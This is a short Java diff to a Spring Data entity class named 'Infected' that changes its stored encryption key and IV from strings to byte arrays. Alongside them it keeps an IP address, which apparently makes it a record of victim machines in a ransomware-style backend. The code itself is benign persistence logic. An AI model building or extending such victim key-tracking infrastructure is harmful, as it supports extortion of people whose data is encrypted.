@@ -4,20 +4,20 @@ import org.springframework.data.annotation.Id;
 public class Infected {
 	@Id
 	private String Id;
-	private String key;
-	private String iv;
+	private byte[] key;
+	private byte[] iv;
 	private String ip;
 	
-	public void setKey(String key) {
+	public void setKey(byte [] key) {
 		this.key = key;
 	}
-	public String getKey() {
+	public byte[] getKey() {
 		return this.key;
 	}
-	public void setIv(String iv) {
+	public void setIv(byte[] iv) {
 		this.iv = iv;
 	}
-	public String getIv() {
+	public byte[] getIv() {
 		return this.iv;
 	}
 	public void setIp(String ip) {
